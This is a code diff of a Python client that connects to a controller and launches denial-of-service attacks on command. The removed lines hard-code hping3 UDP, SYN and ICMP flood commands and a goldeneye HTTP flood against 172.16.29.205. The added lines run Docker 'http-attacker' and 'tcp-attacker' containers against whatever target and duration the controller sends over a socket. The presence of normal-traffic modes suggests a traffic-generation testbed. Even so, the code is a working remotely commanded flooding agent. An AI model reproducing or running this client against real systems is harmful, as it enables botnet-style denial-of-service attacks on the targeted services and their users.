@@ -1,131 +1,188 @@
+# client.py
 import socket
 import subprocess
-import os
 import signal
 import time
+import json
 import shutil
-from pathlib import Path
+import sys
 
-PORT_CMD = 7745
+CONTROLLER_HOST = "localhost"
+CONTROLLER_PORT = 8545
+RECONNECT_DELAY = 5
 
-mode_binaries = {
-    "normal_traffic": ("python3", ["traffic-gen.py", "--mode", "normal"]),
-    "high_traffic": ("python3", ["traffic-gen.py", "--mode", "high"]),
-    "udp_flood": ("hping3", ["--udp", "172.16.29.205", "-p", "80", "--flood"]),
-    "tcp_flood": ("hping3", ["-S", "172.16.29.205", "-p", "80", "--flood"]),
-    "http_flood": ("python3", ["goldeneye.py", "http://172.16.29.205"]),
-    "icmp_flood": ("hping3", ["-1", "172.16.29.205", "--flood"])
+ATTACK_CONTAINERS = {
+    "http": "attack-system/http-attacker",
+    "tcp": "attack-system/tcp-attacker"
 }
 
-class NetworkMonitor:
-    def __init__(self, port=PORT_CMD):
-        self.port = port
-        self.sock = None
-        self.current_process = None
-        self.current_mode = None
+def find_docker():
+    docker_path = shutil.which("docker")
+    if docker_path:
+        return docker_path
+    
+    print("Docker not found. Please install Docker.")
+    sys.exit(1)
 
-    def find_binary(self, binary_name):
-        local_path = Path(".") / binary_name
-        if local_path.exists():
-            return str(local_path)
-        
-        system_binary = shutil.which(binary_name)
-        if system_binary:
-            return system_binary
-            
+def connect_to_controller():
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((CONTROLLER_HOST, CONTROLLER_PORT))
+            print(f"Connected to controller at {CONTROLLER_HOST}:{CONTROLLER_PORT}")
+            return sock
+        except ConnectionRefusedError:
+            print(f"Retrying connection in {RECONNECT_DELAY} seconds...")
+            time.sleep(RECONNECT_DELAY)
+        except Exception as e:
+            print(f"Connection error: {e}")
+            time.sleep(RECONNECT_DELAY)
+
+def launch_http_attack(target, duration, threads=2, connections=10):
+    docker_cmd = [
+        find_docker(), "run", "--rm", "-d",
+        ATTACK_CONTAINERS["http"],
+        "-t", str(threads),
+        "-c", str(connections),
+        "-d", str(duration),
+        target
+    ]
+    
+    try:
+        output = subprocess.check_output(docker_cmd)
+        container_id = output.decode('utf-8').strip()
+        print(f"Started HTTP attack container: {container_id[:12]}")
+        return container_id
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to start HTTP attack: {e.output.decode('utf-8')}")
         return None
 
-    def connect_to_controller(self):
-        while True:
-            try:
-                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                self.sock.connect(("localhost", self.port))
-                print(f"Connected to controller at localhost:{self.port}")
-                return
-            except ConnectionRefusedError:
-                print("Retrying connection in 5 seconds")
-                time.sleep(5)
+def launch_tcp_attack(target, duration):
+    try:
+        host, port = target.split(":")
+    except ValueError:
+        print(f"Invalid target format for TCP attack: {target}")
+        return None
+    
+    docker_cmd = [
+        find_docker(), "run", "--rm", "-d",
+        ATTACK_CONTAINERS["tcp"],
+        "-t", str(duration),
+        "-p", port,
+        host
+    ]
+    
+    try:
+        output = subprocess.check_output(docker_cmd)
+        container_id = output.decode('utf-8').strip()
+        print(f"Started TCP attack container: {container_id[:12]}")
+        return container_id
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to start TCP attack: {e.output.decode('utf-8')}")
+        return None
 
-    def launch_process(self, mode):
-        if mode not in mode_binaries:
-            print(f"Unknown mode: {mode}")
-            return False
-
-        binary_name, args = mode_binaries[mode]
-        binary_path = self.find_binary(binary_name)
-
-        if not binary_path:
-            print(f"Binary not found: {binary_name}")
-            return False
-
-        try:
-            process = subprocess.Popen(
-                [binary_path] + args,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
-            self.current_process = process
-            print(f"Launched process for mode {mode} with PID {process.pid}")
-            return True
-        except Exception as e:
-            print(f"Failed to launch process: {e}")
-            return False
-
-    def kill_current_process(self):
-        if self.current_process:
-            try:
-                os.kill(self.current_process.pid, signal.SIGKILL)
-                self.current_process.wait(timeout=5)
-            except (ProcessLookupError, subprocess.TimeoutExpired):
-                pass
-            print(f"Killed process with PID {self.current_process.pid}")
-            self.current_process = None
-
-    def handle_mode_change(self, new_mode):
-        if new_mode != self.current_mode:
-            print(f"Mode change detected: {new_mode}")
-            self.kill_current_process()
-            if self.launch_process(new_mode):
-                self.current_mode = new_mode
-
-    def run(self):
-        while True:
-            try:
-                if not self.sock:
-                    self.connect_to_controller()
-
-                mode = self.sock.recv(1024).decode().strip()
-                if not mode:
-                    print("Lost connection to controller")
-                    self.sock.close()
-                    self.sock = None
-                    continue
-
-                self.handle_mode_change(mode)
-
-            except socket.error as e:
-                print(f"Socket error: {e}")
-                if self.sock:
-                    self.sock.close()
-                    self.sock = None
-                time.sleep(5)
-            except Exception as e:
-                print(f"Unexpected error: {e}")
-                time.sleep(5)
-
-    def cleanup(self):
-        self.kill_current_process()
-        if self.sock:
-            self.sock.close()
+def stop_container(container_id):
+    if not container_id:
+        return
+    
+    try:
+        subprocess.run([find_docker(), "stop", container_id], check=True)
+        print(f"Stopped container: {container_id[:12]}")
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to stop container: {e}")
 
 def main():
-    monitor = NetworkMonitor()
-    try:
-        monitor.run()
-    except KeyboardInterrupt:
+    current_container = None
+    sock = None
+    
+    def signal_handler(sig, frame):
         print("\nShutting down client...")
-    finally:
-        monitor.cleanup()
+        if current_container:
+            stop_container(current_container)
+        if sock:
+            sock.close()
+        sys.exit(0)
+    
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+    
+    while True:
+        try:
+            if not sock:
+                sock = connect_to_controller()
+            
+            data = sock.recv(4096).decode('utf-8').strip()
+            if not data:
+                print("Connection closed by controller")
+                sock.close()
+                sock = None
+                time.sleep(RECONNECT_DELAY)
+                continue
+            
+            try:
+                command = json.loads(data)
+                print(f"Received command: {command}")
+                
+                if current_container:
+                    stop_container(current_container)
+                    current_container = None
+                
+                cmd_type = command.get("type")
+                
+                if cmd_type == "attack":
+                    attack_type = command.get("attack_type")
+                    duration = command.get("duration", 60)
+                    target = command.get("target")
+                    
+                    if not target:
+                        print("Error: No target specified")
+                        continue
+                    
+                    if attack_type == "http":
+                        threads = command.get("threads", 2)
+                        connections = command.get("connections", 10)
+                        current_container = launch_http_attack(target, duration, threads, connections)
+                    elif attack_type == "tcp":
+                        current_container = launch_tcp_attack(target, duration)
+                    else:
+                        print(f"Unknown attack type: {attack_type}")
+                        
+                    if current_container:
+                        status = {
+                            "type": "status",
+                            "status": "attack_started",
+                            "attack_type": attack_type,
+                            "container_id": current_container
+                        }
+                        sock.sendall(json.dumps(status).encode('utf-8'))
+                
+                elif cmd_type == "stop":
+                    if current_container:
+                        stop_container(current_container)
+                        current_container = None
+                    
+                    status = {
+                        "type": "status",
+                        "status": "stopped"
+                    }
+                    sock.sendall(json.dumps(status).encode('utf-8'))
+                
+                elif cmd_type == "ping":
+                    sock.sendall(json.dumps({"type": "pong"}).encode('utf-8'))
+                
+            except json.JSONDecodeError:
+                print(f"Invalid JSON received: {data}")
+        
+        except socket.error as e:
+            print(f"Socket error: {e}")
+            if sock:
+                sock.close()
+                sock = None
+            time.sleep(RECONNECT_DELAY)
+        
+        except Exception as e:
+            print(f"Unexpected error: {e}")
+            time.sleep(1)
 
 if __name__ == "__main__":
     main()
